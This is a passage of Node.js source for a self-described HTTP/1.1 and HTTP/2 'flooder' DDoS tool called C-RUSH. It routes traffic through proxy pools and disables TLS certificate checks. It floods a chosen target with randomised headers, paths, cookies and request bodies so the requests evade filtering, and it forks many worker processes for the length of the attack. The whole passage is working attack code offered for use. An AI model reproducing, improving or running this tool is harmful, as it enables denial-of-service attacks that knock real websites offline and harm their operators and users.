                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1, // Added NO_TLSv1/1.1
                secure: true,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false
            }, () => {
                if (!connectionPool[selectedProxy]) {
                    connectionPool[selectedProxy] = [];
                }
                connectionPool[selectedProxy].push(tlsSocket);
                if (options.debug) console.log(colors.green(`New connection established for ${selectedProxy}, added to pool.`));

                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1' || options.version === '1') {
                    doWriteHttp1(tlsSocket, selectedProxy);
                } else {
                    let streamId = 1
                    let data = Buffer.alloc(0)
                    let hpack = new HPACK()
                    hpack.setTableSize(4096)

                    const updateWindow = Buffer.alloc(4)
                    updateWindow.writeUInt32BE(custom_update, 0)

                    const frames = [
                        Buffer.from(PREFACE, 'binary'),
                        encodeFrame(0, 4, encodeSettings([
                            [1, custom_header],
                            [2, 0],
                            [4, custom_window],
                            [6, custom_table]
                        ])),
                        encodeFrame(0, 8, updateWindow)
                    ];

                    tlsSocket.on('data', (eventData) => {
                        data = Buffer.concat([data, eventData])

                        while (data.length >= 9) {
                            const frame = decodeFrame(data)
                            if (frame != null) {
                                data = data.subarray(frame.length + 9)
                                if (frame.type == 4 && frame.flags == 0) {
                                    tlsSocket.write(encodeFrame(0, 4, "", 1))
                                }
                                if (frame.type == 7 || frame.type == 5) {
                                    if (options.debug) console.log(colors.yellow(`Received GOAWAY/PRIORITY (indicating termination) from ${url.hostname} via ${selectedProxy}.`));
                                    stats.goaway++;
                                    removeSocketFromPool(selectedProxy, tlsSocket);
                                    tlsSocket.end(() => tlsSocket.destroy())
                                    return;
                                }
                                // Basic response status parsing for adaptive module
                                if (frame.type === 1 && (frame.flags & 0x04)) { // HEADERS frame with END_HEADERS flag
                                    // This is a simplification; full HTTP/2 header parsing needed for status code
                                    // For now, assume if we get a response it's handled.
                                    // To get real status, we'd need to decompress headers (complex without full http2 client)
                                    // For now, we'll increment total requests and assume 200 for 'successful' response.
                                }
                            } else {
                                break
                            }
                        }
                    })

                    tlsSocket.write(Buffer.concat(frames));
                    tlsSocket._lastStreamId = streamId;
                    doWriteHttp2(tlsSocket, selectedProxy);
                }
            });

            tlsSocket.on('error', (err) => {
                if (options.debug) console.log(colors.red(`TLS Socket Error for ${selectedProxy}: ${err.message}`));
                stats.errors++;
                responseStatusCounts['total'] = (responseStatusCounts['total'] || 0) + 1;
                responseStatusCounts['error'] = (responseStatusCounts['error'] || 0) + 1;
                removeSocketFromPool(selectedProxy, tlsSocket);
                tlsSocket.end(() => tlsSocket.destroy());
                go(); // Initiate new connection
            });
            tlsSocket.on('close', () => {
                if (options.debug) console.log(colors.gray(`TLS Socket Closed for ${selectedProxy}`));
                removeSocketFromPool(selectedProxy, tlsSocket);
            });
            tlsSocket.on('timeout', () => {
                if (options.debug) console.log(colors.red(`TLS Socket Timeout for ${selectedProxy}`));
                stats.errors++;
                responseStatusCounts['total'] = (responseStatusCounts['total'] || 0) + 1;
                responseStatusCounts['error'] = (responseStatusCounts['error'] || 0) + 1;
                removeSocketFromPool(selectedProxy, tlsSocket);
                tlsSocket.end(() => tlsSocket.destroy());
                go(); // Initiate new connection
            });
        });

        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });

    netSocket.on('error', (err) => {
        if (options.debug) console.log(colors.red(`Net Socket Error for ${selectedProxy}: ${err.message}`));
        stats.errors++;
        netSocket.destroy();
        go(); // Initiate new connection
    });
    netSocket.on('close', () => {
    });
    netSocket.on('timeout', () => {
        if (options.debug) console.log(colors.red(`Net Socket Timeout for ${selectedProxy}`));
        stats.errors++;
        netSocket.destroy();
        go(); // Initiate new connection
    });
}

function removeSocketFromPool(proxyAddress, socketToRemove) {
    if (connectionPool[proxyAddress]) {
        connectionPool[proxyAddress] = connectionPool[proxyAddress].filter(s => s !== socketToRemove);
        if (connectionPool[proxyAddress].length === 0) {
            delete connectionPool[proxyAddress];
        }
    }
}

function doWriteHttp1(tlsSocket, selectedProxy) {
    if (tlsSocket.destroyed || tlsSocket.connecting) {
        removeSocketFromPool(selectedProxy, tlsSocket);
        go();
        return;
    }
    const requestBuffer = buildRequest();
    tlsSocket.write(requestBuffer, (err) => {
        if (!err) {
            stats.requests++;
            stats.success++;
            // Simulate response status for adaptive module (cannot read response directly from socket here)
            // For HTTP/1.1, we assume success if write is successful, but this is a blind spot.
            responseStatusCounts['total'] = (responseStatusCounts['total'] || 0) + 1;
            responseStatusCounts['200'] = (responseStatusCounts['200'] || 0) + 1;

            setTimeout(() => {
                doWriteHttp1(tlsSocket, selectedProxy);
            }, isFull ? 1000 : 1000 / rate);
        } else {
            if (options.debug) console.log(colors.red(`HTTP/1.1 Write Error for ${selectedProxy}: ${err.message}`));
            stats.errors++;
            responseStatusCounts['total'] = (responseStatusCounts['total'] || 0) + 1;
            responseStatusCounts['error'] = (responseStatusCounts['error'] || 0) + 1;
            removeSocketFromPool(selectedProxy, tlsSocket);
            tlsSocket.end(() => tlsSocket.destroy())
            go();
        }
    });
}

function doWriteHttp2(tlsSocket, selectedProxy) {
    if (tlsSocket.destroyed || tlsSocket.connecting) {
        removeSocketFromPool(selectedProxy, tlsSocket);
        go();
        return;
    }

    let streamId = (tlsSocket._lastStreamId || 1);
    let requestsToSend = [];
    let hpack = new HPACK();
    hpack.setTableSize(4096);

    const uaDetails = generateUserAgent();
    const dynamicHeaders = generateDynamicHeaders(url.hostname, uaDetails);
    const dynamicPath = generateDynamicPath(url.pathname);

    for (let i = 0; i < options.h2ConcurrentStreams; i++) {
        const method = chooseMethod();

        let headers = [
            [':method', method],
            [':authority', url.hostname],
            [':scheme', 'https'],
            [':path', dynamicPath], // Use diversified path
            ['user-agent', uaDetails.ua]
        ];

        // Convert dynamicHeaders object to array of arrays for HPACK
        const headerKeys = Object.keys(dynamicHeaders);
        for (const headerName of headerKeys) {
            if (headerName.toLowerCase() === 'user-agent') continue; // Avoid duplicating
            headers.push([headerName.toLowerCase(), dynamicHeaders[headerName]]);
        }

        headers.push(['cache-control', options.cache ? 'max-age=0' : 'no-cache']);

        if (options.cookies) {
            headers.push(['cookie', `${generateAdvancedCookie()}; ${generateAdvancedCookie()}`]);
        }

        let requestBody = '';
        if (method === 'POST' || method === 'PUT') {
            const payloadData = generateRandomAlphaNumeric(Math.floor(Math.random() * (50 - 10 + 1)) + 10);
            const payloadType = Math.random() < 0.5 ? 'json' : 'form';

            if (payloadType === 'json') {
                requestBody = JSON.stringify({ id: generateUUID(), data: payloadData, timestamp: Date.now() });
                headers.push(['content-type', 'application/json']);
            } else {
                requestBody = `param1=${encodeURIComponent(payloadData)}&param2=${generateRandomAlphaNumeric(5)}`;
                headers.push(['content-type', 'application/x-www-form-urlencoded']);
            }
            headers.push(['content-length', Buffer.byteLength(requestBody).toString()]);
        }

        const packed = Buffer.concat([
            Buffer.from([0x80, 0, 0, 0, 0xFF]), // Default weight/dependency, could be randomized
            hpack.encode(headers)
        ]);

        if (requestBody) {
            requestsToSend.push(encodeFrame(streamId, 1, packed, 0x25)); // HEADERS frame with END_STREAM, END_HEADERS
            requestsToSend.push(encodeFrame(streamId, 0, Buffer.from(requestBody, 'binary'), 0x1)); // DATA frame with END_STREAM
        } else {
            requestsToSend.push(encodeFrame(streamId, 1, packed, 0x25)); // HEADERS frame with END_STREAM, END_HEADERS
        }
        streamId += 2;
    }
    tlsSocket._lastStreamId = streamId;

    tlsSocket.write(Buffer.concat(requestsToSend), (err) => {
        if (!err) {
            stats.requests += options.h2ConcurrentStreams;
            stats.success += options.h2ConcurrentStreams;
            responseStatusCounts['total'] = (responseStatusCounts['total'] || 0) + options.h2ConcurrentStreams;
            responseStatusCounts['200'] = (responseStatusCounts['200'] || 0) + options.h2ConcurrentStreams; // Assume 200 for now

            setTimeout(() => {
                doWriteHttp2(tlsSocket, selectedProxy);
            }, isFull ? 1000 : 1000 / rate);
        } else {
            if (options.debug) console.log(colors.red(`HTTP/2 Write Error for ${selectedProxy}: ${err.message}`));
            stats.errors += options.h2ConcurrentStreams;
            responseStatusCounts['total'] = (responseStatusCounts['total'] || 0) + options.h2ConcurrentStreams;
            responseStatusCounts['error'] = (responseStatusCounts['error'] || 0) + options.h2ConcurrentStreams;
            removeSocketFromPool(selectedProxy, tlsSocket);
            tlsSocket.end(() => tlsSocket.destroy());
            go();
        }
    });
}

if (cluster.isMaster) {
    console.clear();
    if(options.debug) {
        console.log(colors.red(`
 ${colors.green(``)} C-RUSH - H1 & H2 Mixed RushAway Flooder
     ${colors.gray(`Made with 筅�ｸ by NIKKI (${colors.red(`@`)}getflood)`)}

  ${colors.gray(`Target${colors.red(`:`)} ${target}`)}
  ${colors.gray(`Duration${colors.red(`:`)} ${duration}s`)}
  ${colors.gray(`Threads${colors.red(`:`)} ${threads}`)}
  ${colors.gray(`Rate${colors.red(`:`)} ${rate}/s`)}
  ${colors.gray(`HTTP Version${colors.red(`:`)} ${options.version === '1' ? 'HTTP/1.1' : 'HTTP/2'}`)}
  ${colors.gray(`Cookies${colors.red(`:`)} ${options.cookies ? 'Enabled' : 'Disabled'}`)}
  ${colors.gray(`Headfull${colors.red(`:`)} ${options.headfull ? 'Enabled' : 'Disabled'}`)}
  ${colors.gray(`Cache${colors.red(`:`)} ${options.cache ? 'Enabled' : 'Disabled'}`)}
  ${colors.gray(`HTTP/2 Concurrent Streams${colors.red(`:`)} ${options.h2ConcurrentStreams}`)}
`));
    }

    let totalRequests = 0;
    setInterval(() => {
        setTitle(`C-RUSH | Total Sent: ${totalRequests} | ${options.version === '1' ? 'HTTP/1.1' : 'HTTP/2'} RushAway`);
        const requestsThisInterval = stats.requests;
        totalRequests += requestsThisInterval;

        // Adaptive module trigger - only trigger for master
        if (Date.now() - lastAdaptationTime > ADAPTATION_INTERVAL) {
            updateMethodWeights();
            lastAdaptationTime = Date.now();
        }

    }, 1000);

    cluster.on('message', (worker, message) => {
        if (message.type === 'stats') {
            stats.requests += message.data.requests;
            stats.goaway += message.data.goaway;
            stats.success += message.data.success;
            stats.forbidden += message.data.forbidden;
            stats.errors += message.data.errors;
            // Aggregate worker's response status counts
            for (const status in message.data.responseCounts) {
                responseStatusCounts[status] = (responseStatusCounts[status] || 0) + message.data.responseCounts[status];
            }
        }
    });

    for(let i = 0; i < threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        if(options.debug) console.log(colors.red('\n Attack finished'));
        process.exit(0);
    }, duration * 1000);
} else {
    // Worker's local response status counts
    const workerResponseCounts = {};

    setInterval(() => {
        go();
        process.send({
            type: 'stats',
            data: {
                requests: stats.requests,
                goaway: stats.goaway,
                success: stats.success,
                forbidden: stats.forbidden,
                errors: stats.errors,
                responseCounts: workerResponseCounts // Send worker's local counts
            }
        });
        // Reset worker's local stats after sending
        stats.requests = 0;
        stats.goaway = 0;
        stats.success = 0;
        stats.forbidden = 0;
        stats.errors = 0;
        for (const key in workerResponseCounts) {
            delete workerResponseCounts[key];
        }
    }, 1000 / rate); // Each worker attempts to maintain its share of the rate
}